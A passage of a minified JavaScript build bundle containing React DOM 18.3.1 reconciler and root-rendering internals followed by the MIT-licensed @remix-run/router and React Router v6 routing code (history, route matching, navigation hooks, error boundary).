11:n=rc(null,n,s,e,t);break e;case 14:n=ic(null,n,s,Le(s.type,e),t);break e}throw Error(S(306,s,""))}return n;case 0:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Le(s,r),Ia(e,n,s,r,t);case 1:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Le(s,r),ac(e,n,s,r,t);case 3:e:{if($p(n),e===null)throw Error(S(387));s=n.pendingProps,i=n.memoizedState,r=i.element,yp(e,n),zr(n,s,null,t);var a=n.memoizedState;if(s=a.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},n.updateQueue.baseState=i,n.memoizedState=i,n.flags&256){r=Tt(Error(S(423)),n),n=lc(e,n,s,t,r);break e}else if(s!==r){r=Tt(Error(S(424)),n),n=lc(e,n,s,t,r);break e}else for(we=xn(n.stateNode.containerInfo.firstChild),ke=n,B=!0,Oe=null,t=gp(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(St(),s===r){n=rn(e,n,t);break e}oe(e,n,s,t)}n=n.child}return n;case 5:return wp(n),e===null&&Pa(n),s=n.type,r=n.pendingProps,i=e!==null?e.memoizedProps:null,a=r.children,Ea(s,r)?a=null:i!==null&&Ea(s,i)&&(n.flags|=32),Wp(e,n),oe(e,n,a,t),n.child;case 6:return e===null&&Pa(n),null;case 13:return Gp(e,n,t);case 4:return Ol(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=_t(n,null,s,t):oe(e,n,s,t),n.child;case 11:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Le(s,r),rc(e,n,s,r,t);case 7:return oe(e,n,n.pendingProps,t),n.child;case 8:return oe(e,n,n.pendingProps.children,t),n.child;case 12:return oe(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,r=n.pendingProps,i=n.memoizedProps,a=r.value,D(Mr,s._currentValue),s._currentValue=a,i!==null)if(ze(i.value,a)){if(i.children===r.children&&!me.current){n=rn(e,n,t);break e}}else for(i=n.child,i!==null&&(i.return=n);i!==null;){var l=i.dependencies;if(l!==null){a=i.child;for(var o=l.firstContext;o!==null;){if(o.context===s){if(i.tag===1){o=en(-1,t&-t),o.tag=2;var c=i.updateQueue;if(c!==null){c=c.shared;var p=c.pending;p===null?o.next=o:(o.next=p.next,p.next=o),c.pending=o}}i.lanes|=t,o=i.alternate,o!==null&&(o.lanes|=t),La(i.return,t,n),l.lanes|=t;break}o=o.next}}else if(i.tag===10)a=i.type===n.type?null:i.child;else if(i.tag===18){if(a=i.return,a===null)throw Error(S(341));a.lanes|=t,l=a.alternate,l!==null&&(l.lanes|=t),La(a,t,n),a=i.sibling}else a=i.child;if(a!==null)a.return=i;else for(a=i;a!==null;){if(a===n){a=null;break}if(i=a.sibling,i!==null){i.return=a.return,a=i;break}a=a.return}i=a}oe(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,s=n.pendingProps.children,yt(n,t),r=Ne(r),s=s(r),n.flags|=1,oe(e,n,s,t),n.child;case 14:return s=n.type,r=Le(s,n.pendingProps),r=Le(s.type,r),ic(e,n,s,r,t);case 15:return Hp(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Le(s,r),gr(e,n),n.tag=1,ge(s)?(e=!0,Or(n)):e=!1,yt(n,t),Fp(n,s,r),Oa(n,s,r,t),Ma(null,n,s,!0,e,t);case 19:return Yp(e,n,t);case 22:return Vp(e,n,t)}throw Error(S(156,n.tag))};function cd(e,n){return Mu(e,n)}function xm(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Te(e,n,t,s){return new xm(e,n,t,s)}function ql(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Sm(e){if(typeof e=="function")return ql(e)?1:0;if(e!=null){if(e=e.$$typeof,e===hl)return 11;if(e===fl)return 14}return 2}function Tn(e,n){var t=e.alternate;return t===null?(t=Te(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function wr(e,n,t,s,r,i){var a=2;if(s=e,typeof e=="function")ql(e)&&(a=1);else if(typeof e=="string")a=5;else e:switch(e){case st:return Vn(t.children,r,i,n);case dl:a=8,r|=8;break;case sa:return e=Te(12,t,n,r|2),e.elementType=sa,e.lanes=i,e;case ra:return e=Te(13,t,n,r),e.elementType=ra,e.lanes=i,e;case ia:return e=Te(19,t,n,r),e.elementType=ia,e.lanes=i,e;case wu:return di(t,r,i,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case vu:a=10;break e;case yu:a=9;break e;case hl:a=11;break e;case fl:a=14;break e;case pn:a=16,s=null;break e}throw Error(S(130,e==null?e:typeof e,""))}return n=Te(a,t,n,r),n.elementType=e,n.type=s,n.lanes=i,n}function Vn(e,n,t,s){return e=Te(7,e,s,n),e.lanes=t,e}function di(e,n,t,s){return e=Te(22,e,s,n),e.elementType=wu,e.lanes=t,e.stateNode={isHidden:!1},e}function Xi(e,n,t){return e=Te(6,e,null,n),e.lanes=t,e}function Ki(e,n,t){return n=Te(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function _m(e,n,t,s,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Pi(0),this.expirationTimes=Pi(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Pi(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function Xl(e,n,t,s,r,i,a,l,o){return e=new _m(e,n,t,l,o),n===1?(n=1,i===!0&&(n|=8)):n=0,i=Te(3,null,null,n),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},Rl(i),e}function Em(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:tt,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function ud(e){if(!e)return An;e=e._reactInternals;e:{if(Jn(e)!==e||e.tag!==1)throw Error(S(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(ge(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(S(171))}if(e.tag===1){var t=e.type;if(ge(t))return up(e,t,n)}return n}function pd(e,n,t,s,r,i,a,l,o){return e=Xl(t,s,!0,e,r,i,a,l,o),e.context=ud(null),t=e.current,s=ce(),r=En(t),i=en(s,r),i.callback=n??null,Sn(t,i,r),e.current.lanes=r,Ps(e,r,s),ve(e,s),e}function hi(e,n,t,s){var r=n.current,i=ce(),a=En(r);return t=ud(t),n.context===null?n.context=t:n.pendingContext=t,n=en(i,a),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=Sn(r,n,a),e!==null&&(De(e,r,a,i),hr(e,r,a)),a}function Gr(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function vc(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function Kl(e,n){vc(e,n),(e=e.alternate)&&vc(e,n)}function Tm(){return null}var dd=typeof reportError=="function"?reportError:function(e){console.error(e)};function Ql(e){this._internalRoot=e}fi.prototype.render=Ql.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(S(409));hi(e,n,null,null)};fi.prototype.unmount=Ql.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;Kn(function(){hi(null,e,null,null)}),n[tn]=null}};function fi(e){this._internalRoot=e}fi.prototype.unstable_scheduleHydration=function(e){if(e){var n=Vu();e={blockedOn:null,target:e,priority:n};for(var t=0;t<fn.length&&n!==0&&n<fn[t].priority;t++);fn.splice(t,0,e),t===0&&$u(e)}};function Zl(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function mi(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function yc(){}function Cm(e,n,t,s,r){if(r){if(typeof s=="function"){var i=s;s=function(){var c=Gr(a);i.call(c)}}var a=pd(n,s,e,0,null,!1,!1,"",yc);return e._reactRootContainer=a,e[tn]=a.current,fs(e.nodeType===8?e.parentNode:e),Kn(),a}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var l=s;s=function(){var c=Gr(o);l.call(c)}}var o=Xl(e,0,!1,null,null,!1,!1,"",yc);return e._reactRootContainer=o,e[tn]=o.current,fs(e.nodeType===8?e.parentNode:e),Kn(function(){hi(n,o,t,s)}),o}function gi(e,n,t,s,r){var i=t._reactRootContainer;if(i){var a=i;if(typeof r=="function"){var l=r;r=function(){var o=Gr(a);l.call(o)}}hi(n,a,e,r)}else a=Cm(t,n,e,r,s);return Gr(a)}Uu=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=$t(n.pendingLanes);t!==0&&(vl(n,t|1),ve(n,G()),!(j&6)&&(Ct=G()+500,Rn()))}break;case 13:Kn(function(){var s=sn(e,1);if(s!==null){var r=ce();De(s,e,1,r)}}),Kl(e,1)}};yl=function(e){if(e.tag===13){var n=sn(e,134217728);if(n!==null){var t=ce();De(n,e,134217728,t)}Kl(e,134217728)}};Hu=function(e){if(e.tag===13){var n=En(e),t=sn(e,n);if(t!==null){var s=ce();De(t,e,n,s)}Kl(e,n)}};Vu=function(){return M};Wu=function(e,n){var t=M;try{return M=e,n()}finally{M=t}};ma=function(e,n,t){switch(n){case"input":if(oa(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var r=ai(s);if(!r)throw Error(S(90));bu(s),oa(s,r)}}}break;case"textarea":Su(e,t);break;case"select":n=t.value,n!=null&&ft(e,!!t.multiple,n,!1)}};Pu=$l;Lu=Kn;var Nm={usingClientEntryPoint:!1,Events:[Rs,lt,ai,Nu,Au,$l]},Ut={findFiberByHostInstance:zn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Am={bundleType:Ut.bundleType,version:Ut.version,rendererPackageName:Ut.rendererPackageName,rendererConfig:Ut.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:ln.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=ju(e),e===null?null:e.stateNode},findFiberByHostInstance:Ut.findFiberByHostInstance||Tm,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var tr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!tr.isDisabled&&tr.supportsFiber)try{ti=tr.inject(Am),We=tr}catch{}}xe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Nm;xe.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Zl(n))throw Error(S(200));return Em(e,n,null,t)};xe.createRoot=function(e,n){if(!Zl(e))throw Error(S(299));var t=!1,s="",r=dd;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=Xl(e,1,!1,null,null,t,!1,s,r),e[tn]=n.current,fs(e.nodeType===8?e.parentNode:e),new Ql(n)};xe.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(S(188)):(e=Object.keys(e).join(","),Error(S(268,e)));return e=ju(n),e=e===null?null:e.stateNode,e};xe.flushSync=function(e){return Kn(e)};xe.hydrate=function(e,n,t){if(!mi(n))throw Error(S(200));return gi(null,e,n,!0,t)};xe.hydrateRoot=function(e,n,t){if(!Zl(e))throw Error(S(405));var s=t!=null&&t.hydratedSources||null,r=!1,i="",a=dd;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(i=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),n=pd(n,null,e,1,t??null,r,!1,i,a),e[tn]=n.current,fs(e),s)for(e=0;e<s.length;e++)t=s[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new fi(n)};xe.render=function(e,n,t){if(!mi(n))throw Error(S(200));return gi(null,e,n,!1,t)};xe.unmountComponentAtNode=function(e){if(!mi(e))throw Error(S(40));return e._reactRootContainer?(Kn(function(){gi(null,null,e,!1,function(){e._reactRootContainer=null,e[tn]=null})}),!0):!1};xe.unstable_batchedUpdates=$l;xe.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!mi(t))throw Error(S(200));if(e==null||e._reactInternals===void 0)throw Error(S(38));return gi(e,n,t,!1,s)};xe.version="18.3.1-next-f1338f8080-20240426";function hd(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(hd)}catch(e){console.error(e)}}hd(),hu.exports=xe;var Pm=hu.exports,fd,wc=Pm;fd=wc.createRoot,wc.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ss(){return Ss=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ss.apply(this,arguments)}var yn;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(yn||(yn={}));const kc="popstate";function Lm(e){e===void 0&&(e={});function n(s,r){let{pathname:i,search:a,hash:l}=s.location;return qa("",{pathname:i,search:a,hash:l},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(s,r){return typeof r=="string"?r:Yr(r)}return Om(n,t,null,e)}function q(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function Jl(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Rm(){return Math.random().toString(36).substr(2,8)}function bc(e,n){return{usr:e.state,key:e.key,idx:n}}function qa(e,n,t,s){return t===void 0&&(t=null),Ss({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?Ot(n):n,{state:t,key:n&&n.key||s||Rm()})}function Yr(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function Ot(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function Om(e,n,t,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:i=!1}=s,a=r.history,l=yn.Pop,o=null,c=p();c==null&&(c=0,a.replaceState(Ss({},a.state,{idx:c}),""));function p(){return(a.state||{idx:null}).idx}function d(){l=yn.Pop;let x=p(),m=x==null?null:x-c;c=x,o&&o({action:l,location:w.location,delta:m})}function h(x,m){l=yn.Push;let f=qa(w.location,x,m);c=p()+1;let g=bc(f,c),k=w.createHref(f);try{a.pushState(g,"",k)}catch(_){if(_ instanceof DOMException&&_.name==="DataCloneError")throw _;r.location.assign(k)}i&&o&&o({action:l,location:w.location,delta:1})}function v(x,m){l=yn.Replace;let f=qa(w.location,x,m);c=p();let g=bc(f,c),k=w.createHref(f);a.replaceState(g,"",k),i&&o&&o({action:l,location:w.location,delta:0})}function y(x){let m=r.location.origin!=="null"?r.location.origin:r.location.href,f=typeof x=="string"?x:Yr(x);return f=f.replace(/ $/,"%20"),q(m,"No window.location.(origin|href) available to create URL for href: "+f),new URL(f,m)}let w={get action(){return l},get location(){return e(r,a)},listen(x){if(o)throw new Error("A history only accepts one active listener");return r.addEventListener(kc,d),o=x,()=>{r.removeEventListener(kc,d),o=null}},createHref(x){return n(r,x)},createURL:y,encodeLocation(x){let m=y(x);return{pathname:m.pathname,search:m.search,hash:m.hash}},push:h,replace:v,go(x){return a.go(x)}};return w}var xc;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(xc||(xc={}));function jm(e,n,t){return t===void 0&&(t="/"),Im(e,n,t)}function Im(e,n,t,s){let r=typeof n=="string"?Ot(n):n,i=eo(r.pathname||"/",t);if(i==null)return null;let a=md(e);Mm(a);let l=null;for(let o=0;l==null&&o<a.length;++o){let c=qm(i);l=$m(a[o],c)}return l}function md(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let r=(i,a,l)=>{let o={relativePath:l===void 0?i.path||"":l,caseSensitive:i.caseSensitive===!0,childrenIndex:a,route:i};o.relativePath.startsWith("/")&&(q(o.relativePath.startsWith(s),'Absolute route path "'+o.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),o.relativePath=o.relativePath.slice(s.length));let c=Cn([s,o.relativePath]),p=t.concat(o);i.children&&i.children.length>0&&(q(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),md(i.children,n,p,c)),!(i.path==null&&!i.index)&&n.push({path:c,score:Vm(c,i.index),routesMeta:p})};return e.forEach((i,a)=>{var l;if(i.path===""||!((l=i.path)!=null&&l.includes("?")))r(i,a);else for(let o of gd(i.path))r(i,a,o)}),n}function gd(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,r=t.endsWith("?"),i=t.replace(/\?$/,"");if(s.length===0)return r?[i,""]:[i];let a=gd(s.join("/")),l=[];return l.push(...a.map(o=>o===""?i:[i,o].join("/"))),r&&l.push(...a),l.map(o=>e.startsWith("/")&&o===""?"/":o)}function Mm(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Wm(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const Dm=/^:[\w-]+$/,zm=3,Fm=2,Bm=1,Um=10,Hm=-2,Sc=e=>e==="*";function Vm(e,n){let t=e.split("/"),s=t.length;return t.some(Sc)&&(s+=Hm),n&&(s+=Fm),t.filter(r=>!Sc(r)).reduce((r,i)=>r+(Dm.test(i)?zm:i===""?Bm:Um),s)}function Wm(e,n){return e.length===n.length&&e.slice(0,-1).every((s,r)=>s===n[r])?e[e.length-1]-n[n.length-1]:0}function $m(e,n,t){let{routesMeta:s}=e,r={},i="/",a=[];for(let l=0;l<s.length;++l){let o=s[l],c=l===s.length-1,p=i==="/"?n:n.slice(i.length)||"/",d=Gm({path:o.relativePath,caseSensitive:o.caseSensitive,end:c},p),h=o.route;if(!d)return null;Object.assign(r,d.params),a.push({params:r,pathname:Cn([i,d.pathname]),pathnameBase:Jm(Cn([i,d.pathnameBase])),route:h}),d.pathnameBase!=="/"&&(i=Cn([i,d.pathnameBase]))}return a}function Gm(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=Ym(e.path,e.caseSensitive,e.end),r=n.match(t);if(!r)return null;let i=r[0],a=i.replace(/(.)\/+$/,"$1"),l=r.slice(1);return{params:s.reduce((c,p,d)=>{let{paramName:h,isOptional:v}=p;if(h==="*"){let w=l[d]||"";a=i.slice(0,i.length-w.length).replace(/(.)\/+$/,"$1")}const y=l[d];return v&&!y?c[h]=void 0:c[h]=(y||"").replace(/%2F/g,"/"),c},{}),pathname:i,pathnameBase:a,pattern:e}}function Ym(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),Jl(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,l,o)=>(s.push({paramName:l,isOptional:o!=null}),o?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,n?void 0:"i"),s]}function qm(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return Jl(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function eo(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const Xm=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Km=e=>Xm.test(e);function Qm(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:r=""}=typeof e=="string"?Ot(e):e,i;if(t)if(Km(t))i=t;else{if(t.includes("//")){let a=t;t=t.replace(/\/\/+/g,"/"),Jl(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+t))}t.startsWith("/")?i=_c(t.substring(1),"/"):i=_c(t,n)}else i=n;return{pathname:i,search:eg(s),hash:ng(r)}}function _c(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function Qi(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Zm(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function vd(e,n){let t=Zm(e);return n?t.map((s,r)=>r===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function yd(e,n,t,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=Ot(e):(r=Ss({},e),q(!r.pathname||!r.pathname.includes("?"),Qi("?","pathname","search",r)),q(!r.pathname||!r.pathname.includes("#"),Qi("#","pathname","hash",r)),q(!r.search||!r.search.includes("#"),Qi("#","search","hash",r)));let i=e===""||r.pathname==="",a=i?"/":r.pathname,l;if(a==null)l=t;else{let d=n.length-1;if(!s&&a.startsWith("..")){let h=a.split("/");for(;h[0]==="..";)h.shift(),d-=1;r.pathname=h.join("/")}l=d>=0?n[d]:"/"}let o=Qm(r,l),c=a&&a!=="/"&&a.endsWith("/"),p=(i||a===".")&&t.endsWith("/");return!o.pathname.endsWith("/")&&(c||p)&&(o.pathname+="/"),o}const Cn=e=>e.join("/").replace(/\/\/+/g,"/"),Jm=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),eg=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,ng=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function tg(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const wd=["post","put","patch","delete"];new Set(wd);const sg=["get",...wd];new Set(sg);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function _s(){return _s=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},_s.apply(this,arguments)}const no=b.createContext(null),rg=b.createContext(null),et=b.createContext(null),vi=b.createContext(null),On=b.createContext({outlet:null,matches:[],isDataRoute:!1}),kd=b.createContext(null);function ig(e,n){let{relative:t}=n===void 0?{}:n;js()||q(!1);let{basename:s,navigator:r}=b.useContext(et),{hash:i,pathname:a,search:l}=Sd(e,{relative:t}),o=a;return s!=="/"&&(o=a==="/"?s:Cn([s,a])),r.createHref({pathname:o,search:l,hash:i})}function js(){return b.useContext(vi)!=null}function Is(){return js()||q(!1),b.useContext(vi).location}function bd(e){b.useContext(et).static||b.useLayoutEffect(e)}function xd(){let{isDataRoute:e}=b.useContext(On);return e?wg():ag()}function ag(){js()||q(!1);let e=b.useContext(no),{basename:n,future:t,navigator:s}=b.useContext(et),{matches:r}=b.useContext(On),{pathname:i}=Is(),a=JSON.stringify(vd(r,t.v7_relativeSplatPath)),l=b.useRef(!1);return bd(()=>{l.current=!0}),b.useCallback(function(c,p){if(p===void 0&&(p={}),!l.current)return;if(typeof c=="number"){s.go(c);return}let d=yd(c,JSON.parse(a),i,p.relative==="path");e==null&&n!=="/"&&(d.pathname=d.pathname==="/"?n:Cn([n,d.pathname])),(p.replace?s.replace:s.push)(d,p.state,p)},[n,s,a,i,e])}function lg(){let{matches:e}=b.useContext(On),n=e[e.length-1];return n?n.params:{}}function Sd(e,n){let{relative:t}=n===void 0?{}:n,{future:s}=b.useContext(et),{matches:r}=b.useContext(On),{pathname:i}=Is(),a=JSON.stringify(vd(r,s.v7_relativeSplatPath));return b.useMemo(()=>yd(e,JSON.parse(a),i,t==="path"),[e,a,i,t])}function og(e,n){return cg(e,n)}function cg(e,n,t,s){js()||q(!1);let{navigator:r}=b.useContext(et),{matches:i}=b.useContext(On),a=i[i.length-1],l=a?a.params:{};a&&a.pathname;let o=a?a.pathnameBase:"/";a&&a.route;let c=Is(),p;if(n){var d;let x=typeof n=="string"?Ot(n):n;o==="/"||(d=x.pathname)!=null&&d.startsWith(o)||q(!1),p=x}else p=c;let h=p.pathname||"/",v=h;if(o!=="/"){let x=o.replace(/^\//,"").split("/");v="/"+h.replace(/^\//,"").split("/").slice(x.length).join("/")}let y=jm(e,{pathname:v}),w=fg(y&&y.map(x=>Object.assign({},x,{params:Object.assign({},l,x.params),pathname:Cn([o,r.encodeLocation?r.encodeLocation(x.pathname).pathname:x.pathname]),pathnameBase:x.pathnameBase==="/"?o:Cn([o,r.encodeLocation?r.encodeLocation(x.pathnameBase).pathname:x.pathnameBase])})),i,t,s);return n&&w?b.createElement(vi.Provider,{value:{location:_s({pathname:"/",search:"",hash:"",state:null,key:"default"},p),navigationType:yn.Pop}},w):w}function ug(){let e=yg(),n=tg(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return b.createElement(b.Fragment,null,b.createElement("h2",null,"Unexpected Application Error!"),b.createElement("h3",{style:{fontStyle:"italic"}},n),t?b.createElement("pre",{style:r},t):null,null)}const pg=b.createElement(ug,null);class dg extends b.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?b.createElement(On.Provider,{value:this.props.routeContext},b.createElement(kd.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function hg(e){let{routeContext:n,match:t,children:s}=e,r=b.useContext(no);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),b.createElement(On.Provider,{value:n},s)}function fg(e,n,t,s){var r;if(n===void 0&&(n=[]),t===void 0&&(t=null),s===void 0&&(s=null),e==null){var i;if(!t)return null;if(t.errors)e=t.matches;else if((i=s)!=null&&i.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let a=e,l=(r=t)==null?void 